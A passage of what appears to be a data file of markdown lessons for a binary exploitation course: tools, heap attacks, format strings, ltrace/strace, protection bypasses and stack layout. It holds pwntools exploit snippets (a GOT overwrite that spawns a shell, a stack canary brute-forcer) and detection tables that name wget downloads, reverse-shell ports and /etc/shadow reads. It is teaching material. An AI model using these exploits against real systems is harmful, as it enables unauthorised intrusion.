| **PIE** | Fixed addresses | Leak binary base |
| **RELRO** | GOT overwrite | Target hooks/fini_array |
| **ASLR** | Fixed libc addr | Leak libc addr |

### file — Binary Identification
\`\`\`bash
file ./binary
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
\`\`\`

Key things to note:
- **32-bit vs 64-bit** → different calling conventions & register sizes
- **statically vs dynamically linked** → static = no libc GOT/PLT
- **stripped vs not stripped** → stripped = no symbol names in GDB

### strings / FLOSS — Extract Readable Strings
\`\`\`bash
strings ./binary                  # Basic ASCII strings
strings -n 8 ./binary            # Minimum 8 chars
floss ./binary                    # Deobfuscates encoded strings too
\`\`\`

Look for: function names, file paths, URLs, passwords, \`/bin/sh\`, \`flag\`, error messages.

### objdump — Quick Disassembly
\`\`\`bash
objdump -d ./binary               # Full disassembly
objdump -d ./binary | grep -A 20 '<main>'  # Just main
objdump -t ./binary               # Symbol table
objdump -R ./binary               # Dynamic relocations (GOT entries)
objdump -M intel -d ./binary      # Intel syntax
\`\`\`

### readelf — ELF Header Inspection
\`\`\`bash
readelf -h ./binary               # ELF header (entry point, arch)
readelf -S ./binary               # Section headers (.text, .got, .bss)
readelf -s ./binary               # Symbol table
readelf -l ./binary               # Program headers (segments)
readelf -d ./binary               # Dynamic section (shared libraries)
\`\`\`

### ROPgadget / ropper — Find ROP Gadgets
\`\`\`bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary --ropchain    # Auto-build execve chain

ropper --file ./binary
ropper --file ./binary --search "pop rdi; ret"
\`\`\`

### one_gadget — Libc One-Shot RCE
\`\`\`bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Returns addresses that give instant shell (if constraints met)
\`\`\`

### pwninit — Patch Binary with Correct Libc
\`\`\`bash
pwninit --bin ./vuln --libc ./libc.so.6
# Outputs: vuln_patched (uses correct libc + ld)
\`\`\`

### seccomp-tools — Sandbox Rule Inspection
\`\`\`bash
seccomp-tools dump ./binary
# Shows which syscalls are allowed/blocked
\`\`\`

### patchelf — Manually Set Libc/Linker
\`\`\`bash
patchelf --set-interpreter ./ld-2.27.so ./binary
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary
\`\`\`

---

## Compilation Flags for Practice

\`\`\`bash
# Everything OFF (easiest — start here)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit, no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# NX on (need ROP, no shellcode)
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Everything ON (realistic)
gcc vuln.c -o vuln -fstack-protector-all -pie -z relro -z now

# Disable ASLR system-wide (for debugging)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Quick Vulnerability Checklist

When you open a binary, ask:
1. **What does \`checksec\` show?** → Determines your exploit strategy
2. **Is there \`gets()\`, \`strcpy()\`, \`sprintf()\`, \`scanf("%s")\`?** → Buffer overflow
3. **Is there \`printf(user_input)\`?** → Format string vulnerability
4. **Is there \`free()\` without nulling pointer?** → Use-after-free
5. **Any interesting functions?** (\`win\`, \`flag\`, \`shell\`, \`system\`) → ret2win candidate
6. **Does it fork?** → Canary brute-force possible (same canary in child)

---

## References
- [Crypto-Cat Binary Exploitation 101 (11 videos)](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)
- [Crypto-Cat CTF Pwn](https://github.com/Crypto-Cat/CTF/tree/main/pwn)
- [HackTricks Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Nightmare (guyinatuxedo)](https://guyinatuxedo.github.io/)
- [Ir0nstone Notes](https://ir0nstone.gitbook.io/notes)`,
  },
  {
    id: "heap-exploitation",
    title: "Heap Exploitation",
    excerpt: "Heap exploitation techniques covering heap memory management, use-after-free, double-free, heap overflow, and tcache poisoning attacks.",
    category: "Binary Exploitation",
    content: `# Heap Exploitation
> Sources: [HackTricks - Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html) | [How2Heap](https://github.com/shellphish/how2heap)

---

## Heap Basics

The heap is dynamic memory allocated at runtime via \`malloc()\`, \`calloc()\`, \`realloc()\` and freed with \`free()\`.

\`\`\`c
char *ptr = malloc(0x20);  // Allocate 0x20 bytes on heap
strcpy(ptr, "hello");
free(ptr);                  // Return chunk to allocator
\`\`\`

### Memory Layout
\`\`\`
[ Text | Data | BSS | Heap →  ...  ← Stack ]
                      ↑ grows up    ↑ grows down
\`\`\`

---

## Chunk Structure (\`malloc_chunk\`)

\`\`\`c
struct malloc_chunk {
    size_t prev_size;    // Size of previous chunk (if free)
    size_t size;         // Size of this chunk + flags (3 LSBs)
    // --- user data starts here when allocated ---
    chunk* fd;           // Forward pointer (only when free)  
    chunk* bk;           // Backward pointer (only when free)
    chunk* fd_nextsize;  // Large bins only
    chunk* bk_nextsize;  // Large bins only
};
\`\`\`

### Size Field Flags (3 LSBs)
| Bit | Name | Meaning |
|---|---|---|
| 0x1 | \`PREV_INUSE\` | Previous chunk is allocated |
| 0x2 | \`IS_MMAPPED\` | Chunk obtained via \`mmap()\` |
| 0x4 | \`NON_MAIN_ARENA\` | Chunk from secondary arena |

### Allocated vs Free Chunk

**Allocated:**
\`\`\`
+------------------+
| prev_size        |  (or prev chunk's data)
+------------------+
| size      | A|M|P|
+------------------+
| user data        |
| ...              |
+------------------+
\`\`\`

**Free:**
\`\`\`
+------------------+
| prev_size        |
+------------------+
| size      | A|M|P|
+------------------+
| fd               |  → next free chunk
+------------------+
| bk               |  → prev free chunk
+------------------+
| (unused)         |
+------------------+
\`\`\`

---

## Bins (Free Chunk Storage)

When chunks are freed, they're placed in bins for reuse:

### Tcache Bins (glibc >= 2.26)
- **Per-thread** cache, fastest allocation
- 64 singly-linked lists (sizes 0x20 to 0x410 on x64)
- Max **7 chunks** per bin
- **LIFO** (Last In, First Out)
- Minimal security checks (exploit-friendly)

### Fast Bins
- Sizes: 0x20 to 0x80 (x64)
- **Singly-linked** (LIFO), never coalesced
- Chunks NOT marked as free (\`PREV_INUSE\` stays set)
- Filled after tcache is full

### Unsorted Bin
- **Single** doubly-linked list
- "Staging area" — freed chunks land here first (if not tcache/fastbin)
- On next \`malloc()\`, chunks sorted into small/large bins or reused

### Small Bins
- 62 doubly-linked lists
- Sizes: 0x20 to 0x3F0 (x64)
- **FIFO** (First In, First Out)
- Exact size match

### Large Bins
- 63 doubly-linked lists
- Sizes > 0x3F0 (x64)
- Sorted by size within each bin
- Best-fit allocation

---

## Common Heap Attacks

### Use-After-Free (UAF)
Accessing memory after \`free()\`. If chunk is reallocated, attacker controls data.

\`\`\`c
char *a = malloc(0x20);
free(a);           // 'a' is freed but pointer still exists
char *b = malloc(0x20);  // b gets same chunk as 'a'
// Writing to 'a' now overwrites 'b's data
\`\`\`

### Double Free
Freeing same chunk twice → appears in free list twice → two allocations return same chunk.

\`\`\`c
free(a);
free(b);  // or something else to avoid glibc double-free check
free(a);  // 'a' in free list twice
// Now malloc() returns 'a' twice → overlapping chunks
\`\`\`

**Tcache Double Free** (glibc < 2.29): No key check, trivial.
**Tcache Double Free** (glibc >= 2.29): Tcache adds a \`key\` field; must overwrite it.

### Heap Overflow
Overflowing from one chunk into adjacent chunk's metadata.

### Fastbin Dup / Tcache Poisoning
Corrupt \`fd\` pointer of free chunk → next allocation at arbitrary address.

\`\`\`python
# Tcache poisoning (simplified)
# 1. Free chunk A → tcache: A
# 2. Overwrite A->fd to point to target 
# 3. malloc() → returns A
# 4. malloc() → returns TARGET (arbitrary write!)
\`\`\`

### Unlink Attack
Corrupt \`fd\`/\`bk\` of a chunk to get arbitrary write during \`unlink()\`.
Modern glibc has safety checks: \`P->fd->bk == P && P->bk->fd == P\`

### House Techniques

| Technique | Target | Condition |
|---|---|---|
| **House of Force** | Top chunk | Overflow into top chunk size |
| **House of Spirit** | Fastbin/Tcache | Forge fake chunk, free it |
| **House of Lore** | Small bin | Corrupt \`bk\` pointer |
| **House of Einherjar** | Backward consolidation | Off-by-one null byte |
| **House of Orange** | \`_IO_FILE\` / unsorted bin | No \`free()\` needed |
| **House of Roman** | Partial overwrite | No leak needed |
| **House of Rabbit** | Fastbin consolidation | Corrupt fastbin fd |

---

## Useful GDB Commands (with pwndbg/GEF)

\`\`\`bash
# Inspect heap state
heap                  # Overview of all chunks
bins                  # Show all bins (tcache, fast, unsorted, small, large)
vis_heap_chunks       # Visual representation
tcachebins            # Tcache specifically
fastbins             
smallbins

# Inspect specific chunk
heap chunk <addr>
malloc_chunk <addr>

# Track allocations
# set breakpoints on malloc/free
b *malloc
b *free
\`\`\`

---

## Key glibc Version Changes

| Version | Change |
|---|---|
| 2.26 | Tcache introduced |
| 2.29 | Tcache key (double-free check) |
| 2.32 | Tcache fd pointer **PROTECT_PTR** (XOR with heap addr >> 12) |
| 2.34 | \`__malloc_hook\` / \`__free_hook\` **removed** |
| 2.35+ | Further hardening of pointer mangling |

---

## References
- [HackTricks Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
- [HackTricks Bins & Allocations](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/bins-and-memory-allocations.html)
- [How2Heap](https://github.com/shellphish/how2heap)
- [Azeria Labs Heap Part 1](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
- [Azeria Labs Heap Part 2](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
- [Nightmare Heap](https://guyinatuxedo.github.io/25-heap/index.html)
`,
  },
  {
    id: "format-strings",
    title: "Format String Vulnerabilities",
    excerpt: "Format string vulnerability exploitation including reading from and writing to arbitrary memory addresses using printf format specifiers.",
    category: "Binary Exploitation",
    content: `# Format String Vulnerabilities
> Sources: [HackTricks - Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html) | [Crypto-Cat: Format String Vulns](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns)

---

## What is a Format String Vulnerability?

Occurs when user input is passed directly as a format string to \`printf()\`, \`sprintf()\`, \`fprintf()\`, etc.

\`\`\`c
// VULNERABLE
printf(user_input);

// SAFE
printf("%s", user_input);
\`\`\`

---

## Format Specifiers Reference

\`\`\`
%x    — hex (4 bytes on 32-bit)
%08x  — hex padded to 8 chars
%p    — pointer (hex with 0x prefix)
%d    — signed decimal
%u    — unsigned decimal
%s    — string (dereference pointer, print until NULL)
%n    — WRITE number of bytes printed so far to address
%hn   — write 2 bytes (half word)
%hhn  — write 1 byte
%<n>$x — direct parameter access (e.g., %6$x = 6th param)
\`\`\`

---

## Exploitation: Arbitrary Read

### Leaking Stack Values
\`\`\`bash
# Leak values off the stack
echo 'AAAA.%x.%x.%x.%x.%x.%x.%x.%x' | ./vuln

# Direct access - leak the Nth param
echo '%6$x' | ./vuln
\`\`\`

### Leaking Arbitrary Addresses (read memory)
\`\`\`python
from pwn import *

p = process('./vuln')

# Read string at address 0x8048000
payload = b'%6$s'          # 4th param (account for padding)
payload += b'xxxx'          # padding to align
payload += p32(0x8048000)   # 6th param = target address

p.sendline(payload)
print(p.clean())
\`\`\`

### Finding Your Offset
\`\`\`bash
# Send 'AAAA' and find where it appears
echo 'AAAA%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x' | ./vuln
# Look for 41414141 in output — that's your offset
\`\`\`

---

## Exploitation: Arbitrary Write

### The \`%n\` Write Primitive
\`%n\` writes the number of bytes printed so far to the address pointed to by the parameter.

\`\`\`
AAAA%.6000d%4$n  → writes 6004 to address at 4th param
\`\`\`

### Writing Specific Values (2 bytes at a time with \`%hn\`)
Since writing huge numbers byte-by-byte is impractical, use \`%hn\` to write 2 bytes at a time:

\`\`\`
HOB = High Order Bytes (upper 2 bytes of target value)
LOB = Low Order Bytes  (lower 2 bytes of target value)

If HOB < LOB:
  [addr+2][addr]%.[HOB-8]x%[offset]$hn%.[LOB-HOB]x%[offset+1]$hn

If HOB > LOB:
  [addr+2][addr]%.[LOB-8]x%[offset+1]$hn%.[HOB-LOB]x%[offset]$hn
\`\`\`

---

## Pwntools Automation

### GOT Overwrite (replace \`printf\` → \`system\`)
\`\`\`python
from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc
libc.address = 0xf7dc2000  # if ASLR disabled

p = process()

# fmtstr_payload(offset, {target_addr: value_to_write})
payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
p.clean()

p.sendline('/bin/sh')
p.interactive()
\`\`\`

### Generic Format String Leak Script
\`\`\`python
from pwn import *

# Crypto-Cat's format string flag leak script
def leak_stack(p, offset_start=1, offset_end=50):
    for i in range(offset_start, offset_end):
        p = process('./vuln')
        p.sendline(f'%{i}$p'.encode())
        result = p.recvline()
        print(f"Offset {i}: {result}")
        p.close()
\`\`\`

---

## Common Targets for Writes

| Target | Purpose |
|---|---|
| GOT entry of \`printf\`/\`puts\` | Redirect to \`system()\` |
| GOT entry of \`exit\` | Loop back to vulnerable function |
| \`.fini_array\` | Execute on program exit |
| Return address on stack | Direct control flow hijack |
| Stack canary location | Bypass canary check |

---

## Useful Reads
- Leak **canary** → bypass stack protection
- Leak **libc address** from GOT → defeat ASLR
- Leak **PIE base** → defeat PIE
- Leak **stack address** → find buffer location for shellcode

---

## References
- [HackTricks Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html)
- [Crypto-Cat: Format String Vulns](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns)
- [Crypto-Cat: Overwriting GOT](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/09-overwriting_got)
- [Ir0nstone: Format Strings](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [Crypto-Cat: fstring_leak_flag.py](https://github.com/Crypto-Cat/CTF/blob/main/pwn/fstring_leak_flag.py)
`,
  },
  {
    id: "ltracestrace",
    title: "Dynamic Tracing: ltrace & strace",
    excerpt: "Dynamic analysis using ltrace and strace to trace library calls and system calls, revealing runtime behavior of binary executables.",
    category: "Binary Exploitation",
    content: `# Dynamic Tracing: ltrace & strace
> Sources: [HackTricks - Reversing Tools](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html) | [Crypto-Cat CTF](https://github.com/Crypto-Cat/CTF)

---

## ltrace — Library Call Tracer

Intercepts and records **library function calls** (libc, etc.) made by a process.

### Basic Usage
\`\`\`bash
ltrace ./binary                   # Trace all library calls
ltrace -i ./binary                # Show instruction pointer
ltrace -e strcmp ./binary          # Filter: only strcmp calls
ltrace -e strcmp+strlen ./binary   # Filter: multiple functions
ltrace -s 200 ./binary            # Show 200 chars of strings (default=32)
ltrace -o output.txt ./binary     # Save output to file
ltrace -p <PID>                   # Attach to running process
ltrace -C ./binary                # Demangle C++ names
ltrace -f ./binary                # Follow forked children
\`\`\`

### What to Look For in Malware/CTF Analysis

| Library Call | What It Reveals |
|---|---|
| \`strcmp("password", user_input)\` | Hardcoded password comparison! |
| \`strncmp(buf, "FLAG{", 5)\` | Flag format check |
| \`fopen("/etc/shadow", "r")\` | Credential access attempt |
| \`system("wget http://...")\` | Second-stage download |
| \`dlopen("libevil.so")\` | Dynamic library loading |
| \`connect(fd, ...)\` | Network connection |
| \`getenv("SECRET_KEY")\` | Environment variable check |
| \`rand()\` / \`srand(seed)\` | Predictable RNG (brute-forceable) |

### Example: Cracking a Password Check
\`\`\`bash
$ ltrace ./crackme
puts("Enter password: ")                              = 17
fgets("hunter2\\n", 256, 0x7f...)                      = 0x7ffd...
strcmp("s3cr3t_p4ss!", "hunter2\\n")                    = -1
puts("Wrong!")                                         = 7

# Password leaked: s3cr3t_p4ss!
\`\`\`

### Example: Seeing Encryption Keys
\`\`\`bash
$ ltrace -s 100 ./encryptor flag.txt
fopen("flag.txt", "r")                                = 0x55a...
fread("HTB{this_is_the_flag}", 1, 1024, 0x55a...)     = 21
srand(1337)                                            = 0
rand()                                                 = 846930886
# Now you know the seed → can reproduce the entire key stream
\`\`\`

---

## strace — System Call Tracer

Intercepts and records **kernel system calls** made by a process.

### Basic Usage
\`\`\`bash
strace ./binary                   # Trace all syscalls
strace -e trace=open ./binary     # Filter: only open() calls
strace -e trace=network ./binary  # Filter: all network syscalls
strace -e trace=file ./binary     # Filter: all file operations
strace -e trace=process ./binary  # Filter: fork, exec, exit, etc.
strace -e trace=memory ./binary   # Filter: mmap, brk, mprotect
strace -f ./binary                # Follow forked children
strace -p <PID>                   # Attach to running process
strace -o output.txt ./binary     # Save output to file
strace -c ./binary                # Summary: syscall count + time
strace -t ./binary                # Timestamps
strace -T ./binary                # Time spent in each syscall
strace -y ./binary                # Decode file descriptors → paths
\`\`\`

### Syscall Categories (Filters)

| Filter | Syscalls Included | Use Case |
|---|---|---|
| \`trace=file\` | open, stat, chmod, unlink, rename | What files does it touch? |
| \`trace=network\` | socket, connect, bind, sendto, recvfrom | C2 communication |
| \`trace=process\` | clone, fork, execve, wait, kill | Process creation/injection |
| \`trace=memory\` | mmap, mprotect, brk, munmap | RWX memory (shellcode?) |
| \`trace=signal\` | signal, sigaction, kill | Signal handling |
| \`trace=ipc\` | shmget, semop, msgget | Inter-process communication |

### What to Look For

| Syscall Pattern | Meaning |
|---|---|
| \`openat(AT_FDCWD, "/etc/passwd")\` | Reading system files |
| \`connect(3, {sa_family=AF_INET, sin_port=htons(4444)})\` | Reverse shell / C2 |
| \`mprotect(0x7f..., 4096, PROT_READ\\|PROT_WRITE\\|PROT_EXEC)\` | Making memory executable (shellcode) |
| \`execve("/bin/sh", ["/bin/sh", "-c", "..."])\` | Spawning shell |
| \`ptrace(PTRACE_TRACEME)\` | Anti-debugging (if fails = being debugged) |
| \`unlink("/tmp/malware")\` | Self-deletion |
| \`clone(child_stack=...)\` | Creating threads / forking |

### Example: Spotting Anti-Debugging
\`\`\`bash
$ strace ./malware 2>&1 | grep ptrace
ptrace(PTRACE_TRACEME, ...)      = -1 EPERM (Operation not permitted)
# Binary detected it's being traced and will exit or change behavior
\`\`\`

### Example: Tracking File Drops
\`\`\`bash
$ strace -e trace=file -y ./dropper 2>&1 | grep -i "creat\\|open.*W\\|unlink"
openat(AT_FDCWD, "/tmp/.hidden_payload", O_WRONLY|O_CREAT) = 4
# Malware dropping payload to /tmp/.hidden_payload
\`\`\`

---

## ltrace vs strace — When to Use Which

| Scenario | Use |
|---|---|
| Crackme / password check | **ltrace** (shows \`strcmp\`, \`strncmp\`) |
| What files does malware access? | **strace** (\`-e trace=file\`) |
| What network connections? | **strace** (\`-e trace=network\`) |
| What libraries/APIs called? | **ltrace** |
| Does it execute other programs? | **strace** (\`-e trace=process\`) |
| Anti-debug detection? | **strace** (shows \`ptrace\` calls) |
| Static binary (no dynamic libs)? | **strace** only (ltrace won't work) |

---

## Pro Tips

\`\`\`bash
# Combine both for full visibility
ltrace -o ltrace.log ./binary &
strace -o strace.log -p $!

# Run binary with ltrace and pipe password
echo "test_password" | ltrace -s 200 ./crackme

# Compare behavior with/without debug
strace -c ./binary              # Normal run timing
strace -c gdb -batch ./binary   # Under GDB — detect anti-debug timing gaps
\`\`\`

---

## References
- [HackTricks - Reversing Tools & Methods](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html)
- [Crypto-Cat Binary Exploitation Setup](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/00-intro)
- \`man ltrace\`, \`man strace\``,
  },
  {
    id: "binary-protections-bypasses",
    title: "Binary Protections & Bypasses",
    excerpt: "Overview of binary security protections including NX, stack canaries, PIE, RELRO, and ASLR along with techniques to bypass each protection.",
    category: "Binary Exploitation",
    content: `# Binary Protections & Bypasses
> Sources: [HackTricks - Protections](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html) | [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)

---

## Quick Check: \`checksec\`

\`\`\`bash
checksec --file=./binary
\`\`\`

\`\`\`
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
\`\`\`

---

## Protection: NX / DEP (No-Execute)

**What:** Stack/heap marked non-executable. Can't run shellcode on the stack.

**Bypass:**
- ROP (Return Oriented Programming) — chain gadgets from executable \`.text\` section
- ret2libc — call existing functions like \`system()\`
- \`mprotect()\` via ROP → make a region executable, then jump to shellcode

\`\`\`bash
# Compile WITHOUT NX (for practice)
gcc -z execstack vuln.c -o vuln
\`\`\`

---

## Protection: ASLR (Address Space Layout Randomization)

**What:** Randomizes base addresses of stack, heap, libraries on each execution. Kernel-level.

**Bypass:**
- **Leak addresses** — use format strings, puts/printf of GOT entries
- **Brute force** — on 32-bit, only ~12 bits of entropy (4096 possibilities)
- **Partial overwrite** — overwrite only lowest 1-2 bytes (which don't change)
- **ret2plt** — PLT addresses are fixed when PIE is off
- **Ret2vsyscall** — vsyscall page is at a fixed address on older kernels

\`\`\`bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0=off, 1=partial, 2=full

# Disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Protection: PIE (Position Independent Executable)

**What:** Randomizes the base address of the binary itself (not just libraries).

**Bypass:**
- **Leak binary address** — partial overwrite, format string leak
- **Brute force** — 32-bit has limited entropy
- **Partial overwrite** — last 12 bits (3 hex chars) are always the same

\`\`\`bash
# Compile WITHOUT PIE
gcc -no-pie vuln.c -o vuln
\`\`\`

---

## Protection: Stack Canary

**What:** Random value placed between local variables and saved return address. Checked before function return — if modified, program calls \`__stack_chk_fail\`.

**Bypass:**
- [Crypto-Cat: Bypassing Canaries](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries)
- **Leak canary** via format string (\`%p\`, \`%x\`) or other info leak
- **Brute force** byte-by-byte (fork-based servers share same canary)
- **Overwrite \`__stack_chk_fail\` GOT** → redirect to continue execution
- **Thread canary** — canary stored in TLS, can sometimes be overwritten via heap

\`\`\`python
# Brute force canary (fork-based server)
canary = b'\\x00'  # Canaries start with null byte
for i in range(7):
    for byte in range(256):
        p = remote(host, port)
        payload = b'A' * offset + canary + bytes([byte])
        p.send(payload)
        response = p.recv(timeout=1)
        if b"stack smashing" not in response:
            canary += bytes([byte])
            break
        p.close()
\`\`\`

---

## Protection: RELRO (Relocation Read-Only)

**What:** Controls writability of GOT.

| Level | GOT Writable? | Exploit Impact |
|---|---|---|
| No RELRO | Yes | GOT overwrite easy |
| Partial RELRO | Yes (GOT still writable) | GOT overwrite works |
| Full RELRO | No (GOT is read-only) | Cannot overwrite GOT — target \`.fini_array\`, \`__malloc_hook\`, \`__free_hook\`, etc. |

**Bypass Full RELRO:**
- Overwrite \`__malloc_hook\` or \`__free_hook\` (older glibc)
- Overwrite \`.fini_array\`
- Overwrite return address on stack (if you can find it)
- Overwrite function pointers in data sections

---

## Protection: Fortify Source

**What:** Compile-time replacement of unsafe functions (\`strcpy\` → \`__strcpy_chk\`) with bounds-checked versions.

**Bypass:** Hard — these are compile-time checks. Find other vulns.

---

## Protection: CET & Shadow Stack

**What:** Hardware-assisted (Intel CET). Maintains a shadow copy of return addresses. Any mismatch = crash.

**Bypass:** 
- JOP (Jump Oriented Programming) instead of ROP
- Very difficult to bypass when properly implemented

---

## Core Dumps for Debugging

\`\`\`bash
# Enable core dumps
ulimit -c unlimited

# Permanent (add to /etc/security/limits.conf)
* soft core unlimited

# Analyze core dump
gdb /path/to/binary /path/to/core
\`\`\`

---

## Summary Cheat Sheet

| Protection | Check | Bypass Strategy |
|---|---|---|
| NX | \`checksec\` | ROP, ret2libc |
| ASLR | \`cat /proc/sys/kernel/randomize_va_space\` | Leak → calculate base |
| PIE | \`checksec\` | Leak binary addr, partial overwrite |
| Canary | \`checksec\` | Leak or brute-force |
| Full RELRO | \`checksec\` | Target hooks/fini_array instead of GOT |

---

## References
- [HackTricks Protections](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [HackTricks ASLR](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/aslr/index.html)
- [HackTricks PIE](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/pie/index.html)
- [HackTricks Canaries](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/index.html)
- [Crypto-Cat: Bypassing Canaries](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries)
- [Crypto-Cat: Leak PIE + Ret2libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc)
`,
  },
  {
    id: "stack",
    title: "STACK",
    excerpt: "Understanding the call stack architecture including stack frames, registers (EBP, ESP, EIP), function prologues and epilogues, and stack-based memory layout.",
    category: "Binary Exploitation",
    content: `### What is the Stack?

The **call stack** (or just "stack") is a special region of a program's memory used for managing function calls and local (temporary) data. It's like a stack of plates: you **push** new items on top when entering a function, and **pop** them off when exiting. This ensures everything happens in the correct order (last in, first out – LIFO).

The stack handles:

- Local variables (e.g., buffers, ints in a function)
- Function parameters (in older calling conventions)
- Saved registers
- Return address (where to go back after the function finishes)

It's fast because it's managed automatically by the CPU instructions (like push, pop, call, ret on x86).

### Why the Stack Grows Downwards

In most architectures (including x86/x86_64 on Linux/Kali), the stack starts at **high memory addresses** and grows **towards lower addresses** (downwards).

Reason:

- The program's code, data, and heap (dynamic memory from malloc) start at **low addresses** and grow **upwards**.
- This leaves a big empty space in the middle for both to expand freely without fixed limits.

![linux - Do memory mapping segment and heap grow until they meet ...](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyW3rDhDVTKj5Q3OhXGyxeUBxtKqQcFmtb9R6xLXXimcaxpWJx&s)


![In-Memory Layout of a Program (Process) « Gabriele Tolomei](https://gabrieletolomei.wordpress.com/wp-content/uploads/2013/10/memory_layout.jpg)

![memory management - Stack and Heap locations in RAM - Stack Overflow](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRH1WTpnOKriohmPu8bbDv6dOdoKMmOprfcm2Wv2KSTahRkPKQ&s)

[stackoverflow.com](https://stackoverflow.com/questions/32418750/stack-and-heap-locations-in-ram)

![How Does Linux Memory Work?. Similar to CPU management, memory ...](https://miro.medium.com/v2/resize:fit:1400/1*CHCagIJgUkFZyL49a9td-g.png)



Typical Linux process virtual memory layout: Code/data at bottom (growing ↑), stack at top (growing ↓), heap in between.

### Key Registers Involved (x86 32-bit Example)

- **EIP** (Instruction Pointer): Points to the next instruction to execute.
- **ESP** (Stack Pointer): Points to the **top** of the stack (lowest address currently in use). Moves down on push/call.
- **EBP** (Base/Frame Pointer): Points to the **base** (higher address) of the current function's frame. Used for easy access to locals.

![x86 Assembly and Call Stack | Computer Security](https://textbook.cs161.org/assets/images/memory-safety/x86/stack7.png)

[textbook.cs161.org](https://textbook.cs161.org/memory-safety/x86.html)

![Stack Frames & Pointers | Cameron Wickes](https://www.cameronwickes.co.uk/_nuxt/uploads/9072fc7-640.jpg)

[cameronwickes.co.uk](https://www.cameronwickes.co.uk/stack-frames-pointers/)

### Detailed Stack Frame Layout (One Function's Space)

When a function is called (function prologue):

1. call instruction pushes the return address and jumps.
2. push ebp saves old EBP.
3. mov ebp, esp sets new frame.
4. sub esp, N allocates space for locals (moves ESP down).

Layout from **high address** to **low address**:

![The details of C function stack (and heap) operation when function ...](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image005.png)

[tenouk.com](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)

![Understanding the Stack — A Precursor to exploiting Buffer ...](https://miro.medium.com/0*0_ldrMQW__kRL7HV.jpg)

[blog.devgenius.io](https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac)

![Stack Frames & Pointers | Cameron Wickes](https://www.cameronwickes.co.uk/_nuxt/uploads/9072fc7-640.jpg)

[cameronwickes.co.uk](https://www.cameronwickes.co.uk/stack-frames-pointers/)

![The details of C function stack (and heap) operation when function ...](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image011.png)

[tenouk.com](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)

![Lab 3: Assembly and Buffer Overflow - HackMD](https://cs.brown.edu/courses/csci1310/2020/assign/labs/assets/lab3-stack6.png)

[cs.brown.edu](https://cs.brown.edu/courses/csci1310/2020/assign/labs/lab3.html)

![Understanding the Stack — A Precursor to exploiting Buffer ...](https://miro.medium.com/v2/resize:fit:1350/0*K992sQOanLQaLOat.jpg)

[blog.devgenius.io](https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac)

- **Arguments** (pushed by caller, higher than EBP)
- **Saved EIP** (return address – critical for control flow)
- **Saved EBP** (old frame pointer)
- **Local variables/buffers** (allocated by sub esp)
- ESP points here ↓ (grows down)

### Why This Matters for Exploits: Buffer Overflow

Vulnerable code like strcpy(buffer, input) doesn't check size. If you send too much input:

- It fills the buffer.
- Overflows into saved EBP.
- Then overwrites **saved EIP** (return address).

When function returns (ret): Pops EIP → program jumps to your controlled address → code execution!

![If the stack grows downwards, how can a buffer overflow overwrite ...](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjqDfS9DMaYATcVJ0CmgO2GuDD0X2IQ3Sv36264Z1Rvi70ZsM&s)

